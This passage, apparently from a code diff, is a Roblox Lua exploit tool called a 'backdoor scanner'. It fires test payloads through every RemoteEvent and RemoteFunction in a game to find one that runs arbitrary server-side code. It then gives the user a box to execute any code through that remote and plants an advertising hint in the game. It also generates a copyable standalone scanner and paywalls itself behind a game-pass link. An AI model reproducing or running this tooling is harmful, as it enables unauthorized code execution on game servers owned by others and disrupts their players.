dragStart\n            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)\n        end\n    end)\nend\n\nlocal Main = Instance.new("Frame", SG)\nMain.Size = UDim2.new(0, 400, 0, 250)\nMain.Position = UDim2.new(0.5, -200, 0.5, -125)\nMain.BackgroundColor3 = Color3.fromRGB(%s)\nInstance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)\nmakeDraggable(Main)\n\nlocal Title = Instance.new("TextLabel", Main)\nTitle.Size = UDim2.new(1, 0, 0, 40)\nTitle.BackgroundTransparency = 1\nTitle.Text = "%s"\nTitle.Font = Enum.Font.RobotoMono\nTitle.TextColor3 = Color3.new(1,1,1)\nTitle.TextScaled = true\n\nlocal ScanBtn = Instance.new("TextButton", Main)\nScanBtn.Size = UDim2.new(0.8, 0, 0, 50)\nScanBtn.Position = UDim2.new(0.1, 0, 0.4, 0)\nScanBtn.Text = "SCAN FOR BACKDOOR"\nScanBtn.Font = Enum.Font.RobotoMono\nScanBtn.BackgroundColor3 = Color3.new(0,0,0)\nScanBtn.BackgroundTransparency = 0.5\nScanBtn.TextColor3 = Color3.new(1,1,1)\nScanBtn.TextScaled = true\nInstance.new("UICorner", ScanBtn)\n\nlocal ExecFrame = Instance.new("Frame", Main)\nExecFrame.Size = UDim2.new(1, 0, 1, 0)\nExecFrame.BackgroundTransparency = 1\nExecFrame.Visible = false\n\nlocal CodeBox = Instance.new("TextBox", ExecFrame)\nCodeBox.Size = UDim2.new(0.9, 0, 0.5, 0)\nCodeBox.Position = UDim2.new(0.05, 0, 0.2, 0)\nCodeBox.BackgroundColor3 = Color3.new(0,0,0)\nCodeBox.BackgroundTransparency = 0.5\nCodeBox.Text = "print(\'Hello\')"\nCodeBox.Font = Enum.Font.RobotoMono\nCodeBox.TextColor3 = Color3.new(1,1,1)\nCodeBox.ClearTextOnFocus = false\nCodeBox.MultiLine = true\nCodeBox.TextXAlignment = 0\nCodeBox.TextYAlignment = 0\nInstance.new("UICorner", CodeBox)\n\nlocal function cBtn(txt, pos, size)\n    local b = Instance.new("TextButton", ExecFrame)\n    b.Size = size; b.Position = pos; b.Text = txt\n    b.BackgroundColor3 = Color3.new(0,0,0)\n    b.BackgroundTransparency = 0.3\n    b.TextColor3 = Color3.new(1,1,1)\n    b.Font = Enum.Font.RobotoMono\n    b.TextScaled = true\n    Instance.new("UICorner", b)\n    return b\nend\n\nlocal ClearBtn = cBtn("CLEAR", UDim2.new(0.05, 0, 0.75, 0), UDim2.new(0.25, 0, 0, 40))\nlocal FillBtn = cBtn("AUTO FILL", UDim2.new(0.35, 0, 0.75, 0), UDim2.new(0.25, 0, 0, 40))\nlocal ExecBtn = cBtn("EXECUTE", UDim2.new(0.65, 0, 0.75, 0), UDim2.new(0.3, 0, 0, 40))\n\nlocal TargetRemote = nil\nlocal IsScanning = false\n\ngame.Workspace.ChildAdded:Connect(function(c)\n    if c.Name == "GP_V" and IsScanning then\n        TargetRemote = _G.CustomScanMap[c.Value]\n        c:Destroy()\n        if TargetRemote then\n            IsScanning = false\n            ScanBtn.Visible = false\n            ExecFrame.Visible = true\n            local hintCode = \'Instance.new("Hint", workspace).Text = "%s"\'\n            pcall(function() \n                if TargetRemote:IsA("RemoteEvent") then TargetRemote:FireServer(hintCode) \n                else task.spawn(function() TargetRemote:InvokeServer(hintCode) end) end \n            end)\n        end\n    end\nend)\n\nScanBtn.MouseButton1Click:Connect(function()\n    if IsScanning then return end\n    IsScanning = true\n    ScanBtn.Text = "SCANNING..."\n    _G.CustomScanMap = {}\n    local remotes = {}\n    for _, s in ipairs({game.ReplicatedStorage, game.JointsService, game.Lighting, game.SoundService, game.Workspace}) do \n        for _, v in ipairs(s:GetDescendants()) do \n            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then table.insert(remotes, v) end \n        end \n    end\n    task.spawn(function()\n        for i, r in ipairs(remotes) do\n            if not IsScanning then break end\n            pcall(function()\n                local uid = tostring(i)\n                _G.CustomScanMap[uid] = r\n                local p = "local a=Instance.new(\'StringValue\',workspace);a.Name=\'GP_V\';a.Value=\'"..uid.."\'"\n                if r:IsA("RemoteEvent") then r:FireServer(p) else task.spawn(function() r:InvokeServer(p) end) end\n            end)\n            if i % 30 == 0 then RunService.Heartbeat:Wait() end\n        end\n    end)\nend)\n\nExecBtn.MouseButton1Click:Connect(function()\n    if TargetRemote then\n        pcall(function() if TargetRemote:IsA("RemoteEvent") then TargetRemote:FireServer(CodeBox.Text) else task.spawn(function() TargetRemote:InvokeServer(CodeBox.Text) end) end end)\n    end\nend)\nClearBtn.MouseButton1Click:Connect(function() CodeBox.Text = "" end)\nFillBtn.MouseButton1Click:Connect(function() CodeBox.Text = CodeBox.Text:gsub(\'"(.-)"\', \'"\' .. LocalPlayer.Name .. \'"\') end)\n',
+			v452,
+			v457,
+			v452,
+			v453
+		)
+
+		if not setclipboard then
+			game:GetService("StarterGui"):SetCore("SendNotification", {
+				Title = "Error",
+				Text = "Your executor doesn't support setclipboard!",
+				Duration = 4,
+			})
+
+			return
+		end
+
+		local n35 = 0
+
+		repeat
+			if n35 == 1 then
+				u253.Text = "COPIED TO CLIPBOARD!"
+				task.wait(2)
+				n35 = 2
+			end
+
+			if n35 == 0 then
+				setclipboard(v458)
+				game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = "Success",
+					Text = "Scanner copied to clipboard!",
+					Duration = 4,
+				})
+				n35 = 1
+			end
+		until n35 == 2
+
+		u253.Text = "CREATE & COPY SCRIPT"
+	end)
+
+	local Frame15 = Instance.new("Frame")
+
+	Frame15.Size = UDim2.new(0, 350, 0, 180)
+	Frame15.AnchorPoint = Vector2.new(0.5, 0.5)
+	Frame15.Position = UDim2.new(0.5, 0, 0.5, 0)
+	Frame15.BackgroundColor3 = t3.FrameBg
+	Frame15.Parent = ScreenGui
+	Instance.new("UICorner", Frame15).CornerRadius = UDim.new(0, 12)
+	v26(Frame15)
+
+	local UIStroke = Instance.new("UIStroke")
+
+	UIStroke.Thickness = 3
+	UIStroke.Parent = Frame15
+
+	local spawn2 = task.spawn
+	local u257 = RunService
+
+	spawn2(function()
+		local n36 = 0
+
+		while true do
+			n36 = n36 + 0.0025
+
+			if n36 > 1 then
+				n36 = 0
+			end
+
+			local color3 = Color3.fromHSV(n36, 0.8, 1)
+
+			if not UIStroke:IsA("UIStroke") or UIStroke.Name == "FixedOutline" then
+				if (UIStroke:IsA("TextLabel") or UIStroke:IsA("TextButton") or UIStroke:IsA("TextBox")) and UIStroke.Name == "RainbowText" then
+					UIStroke.TextColor3 = color3
+				end
+			else
+				UIStroke.Color = color3
+			end
+
+			u257.RenderStepped:Wait()
+		end
+	end)
+
+	local TextLabel7 = Instance.new("TextLabel")
+
+	TextLabel7.Size = UDim2.new(1, 0, 0, 40)
+	TextLabel7.BackgroundTransparency = 1
+	TextLabel7.Position = UDim2.new(0, 0, 0, 5)
+	TextLabel7.Text = "GaksP0wer Backdoor Scanner"
+	TextLabel7.Font = RobotoMono
+	TextLabel7.TextScaled = true
+	TextLabel7.Parent = Frame15
+
+	local UIStroke3 = Instance.new("UIStroke")
+
+	UIStroke3.Name = "FixedOutline"
+	UIStroke3.Thickness = 2.5
+	UIStroke3.Color = t3.DarkOrange
+	UIStroke3.Parent = TextLabel7
+
+	local spawn3 = task.spawn
+	local u261 = RunService
+
+	spawn3(function()
+		local n37 = 0
+
+		while true do
+			n37 = n37 + 0.0025
+
+			if n37 > 1 then
+				n37 = 0
+			end
+
+			local color3 = Color3.fromHSV(n37, 0.8, 1)
+
+			if not TextLabel7:IsA("UIStroke") or TextLabel7.Name == "FixedOutline" then
+				if (TextLabel7:IsA("TextLabel") or TextLabel7:IsA("TextButton") or TextLabel7:IsA("TextBox")) and TextLabel7.Name == "RainbowText" then
+					TextLabel7.TextColor3 = color3
+				end
+			else
+				TextLabel7.Color = color3
+			end
+
+			u261.RenderStepped:Wait()
+		end
+	end)
+
+	local v262 = v84("Scan For Backdoor", UDim2.new(0.1, 0, 0.3, 0), UDim2.new(0.7999999999999545, 0, 0.35, 0), Frame15, "scan")
+	local TextLabel8 = Instance.new("TextLabel")
+
+	TextLabel8.Size = UDim2.new(1, 0, 0, 40)
+	TextLabel8.Position = UDim2.new(0, 0, 0.7, 0)
+	TextLabel8.BackgroundTransparency = 1
+	TextLabel8.Text = "SYSTEM"
+	TextLabel8.Font = RobotoMono
+	TextLabel8.TextScaled = true
+	TextLabel8.Parent = Frame15
+
+	local UIStroke4 = Instance.new("UIStroke")
+
+	UIStroke4.Name = "FixedOutline"
+	UIStroke4.Thickness = 2
+	UIStroke4.Color = t3.DarkOrange
+	UIStroke4.Parent = TextLabel8
+
+	local spawn4 = task.spawn
+	local u266 = TextLabel8
+	local u267 = RunService
+
+	spawn4(function()
+		local n38 = 0
+
+		while true do
+			n38 = n38 + 0.0025
+
+			if n38 > 1 then
+				n38 = 0
+			end
+
+			local color3 = Color3.fromHSV(n38, 0.8, 1)
+
+			if not u266:IsA("UIStroke") or u266.Name == "FixedOutline" then
+				if (u266:IsA("TextLabel") or u266:IsA("TextButton") or u266:IsA("TextBox")) and u266.Name == "RainbowText" then
+					u266.TextColor3 = color3
+				end
+			else
+				u266.Color = color3
+			end
+
+			u267.RenderStepped:Wait()
+		end
+	end)
+
+	local u268 = false
+	local t4 = {}
+	local ChildAdded = game.Workspace.ChildAdded
+	local u271 = TextLabel8
+	local u272 = Frame
+
+	ChildAdded:Connect(function(p29)
+		if p29.Name == "GP_V" and u268 then
+			u89 = t4[p29.Value]
+			p29:Destroy()
+
+			if u89 then
+				u268 = false
+				local v468 = (function(...)
+					local t5 = { ... }
+
+					t5.n = select("#", ...)
+
+					return t5
+				end)(math.random(100, 999))
+
+				u271.Text = "Found In 0.4" .. tostring(unpack(v468, 1, v468.n))
+				pcall(function()
+					if not u89:IsA("RemoteEvent") then
+						task.spawn(function()
+							u89:InvokeServer('Instance.new("Hint", workspace).Text = "GaksP0wer Backdoor Fastest Backdoor On The Mars gg/jCmDTPBsG8"')
+						end)
+
+						return
+					end
+
+					u89:FireServer('Instance.new("Hint", workspace).Text = "GaksP0wer Backdoor Fastest Backdoor On The Mars gg/jCmDTPBsG8"')
+				end)
+
+				local Text = u271.Text
+
+				game:GetService("StarterGui"):SetCore("SendNotification", {
+					Title = "GaksP0wer Backdoor",
+					Text = Text,
+					Duration = 4,
+				})
+				task.wait(0.3)
+				u272.Visible = true
+				Frame15.Visible = false
+			end
+		end
+	end)
+
+	local MouseButton1Click = v262.MouseButton1Click
+	local u274 = RunService
+	local u275 = TextLabel8
+
+	MouseButton1Click:Connect(function()
+		local t6
+		if u268 then
+			return
+		else
+			u268 = true
+			u89 = nil
+			u275.Text = "SCANNING..."
+			t4 = {}
+			t6 = {}
+			local t7 = {}
+			local ReplicatedStorage = game.ReplicatedStorage
+			local JointsService = game.JointsService
+			local Lighting = game.Lighting
+			local SoundService = game.SoundService
+			local Workspace = game.Workspace
+			t7[1] = ReplicatedStorage
+			t7[2] = JointsService
+			t7[3] = Lighting
+			t7[4] = SoundService
+			t7[5] = Workspace
+			for _, v in ipairs(t7) do
+				for _, descendant in ipairs(v:GetDescendants()) do
+					if descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction") then
+						table.insert(t6, descendant)
+					end
+				end
+			end
+			task.spawn(function()
+				for i, v in ipairs(t6) do
+					if not u268 then
+						return
+					end
+
+					local _pcall = pcall
+					local u523 = i
+					local u524 = v
+
+					pcall(function()
+						local str = tostring(u523)
+
+						t4[str] = u524
+
+						local v527 = string.format("local a=Instance.new('StringValue',workspace);a.Name='GP_V';a.Value='%s'", str)
+
+						if not u524:IsA("RemoteEvent") then
+							local spawn5 = task.spawn
+							local u529 = v527
+
+							spawn5(function()
+								u524:InvokeServer(u529)
+							end)
+
+							return
+						end
+
+						u524:FireServer(v527)
+					end)
+
+					if i % 40 == 0 then
+						u274.Heartbeat:Wait()
+					end
+				end
+			end)
+			return
+		end
+	end)
+
+	local MouseButton1Click26 = v134.MouseButton1Click
+	local u277 = TextBox
+	local u278 = LocalPlayer
+
+	MouseButton1Click26:Connect(function()
+		u277.Text = u277.Text:gsub('"(.-)"', '"' .. u278.Name .. '"')
+	end)
+
+	local MouseButton1Click27 = v133.MouseButton1Click
+	local u280 = TextBox
+
+	MouseButton1Click27:Connect(function()
+		u280.Text = ""
+	end)
+
+	local MouseButton1Click28 = v135.MouseButton1Click
+	local u282 = TextBox
+
+	MouseButton1Click28:Connect(function()
+		if u89 then
+			pcall(function()
+				if not u89:IsA("RemoteEvent") then
+					task.spawn(function()
+						u89:InvokeServer(u282.Text)
+					end)
+
+					return
+				end
+
+				u89:FireServer(u282.Text)
+			end)
+		end
+	end)
+
+	return
+end
+local Frame = nil
+local TextLabel = nil
+local TextButton = nil
+do
+	Frame = Instance.new("Frame")
+	Frame.Size = UDim2.new(1, 0, 1, 0)
+	Frame.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+	Frame.Parent = ScreenGui
+	TextLabel = Instance.new("TextLabel")
+	TextLabel.Size = UDim2.new(1, 0, 0.40000000000009095, 0)
+	TextLabel.Position = UDim2.new(0, 0, 0.2, 0)
+	TextLabel.BackgroundTransparency = 1
+	TextLabel.Text = "Pls Buy The Executor For 6 Robux First"
+	TextLabel.Font = RobotoMono
+	TextLabel.TextScaled = true
+	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.Parent = Frame
+	TextButton = Instance.new("TextButton")
+	TextButton.Size = UDim2.new(0, 400, 0, 80)
+	TextButton.Position = UDim2.new(0.5, -200, 0.6, 0)
+	TextButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+	TextButton.Text = "COPY LINK TO CLIPBOARD"
+	TextButton.Font = RobotoMono
+	TextButton.TextScaled = true
+	TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextButton.Parent = Frame
+	Instance.new("UICorner", TextButton)
+	TextButton.MouseButton1Click:Connect(function()
+		if not setclipboard then
+			TextButton.Text = "EXECUTOR DOESNT SUPPORT CLIPBOARD"
+
+			return
+		end
+
+		setclipboard("https://www.roblox.com/tr/game-pass/1745993057/Buy-The-Executor-Remade")
+		TextButton.Text = "COPIED!"
+		task.wait(2)
+		TextButton.Text = "COPY LINK TO CLIPBOARD"
+	end)
+end
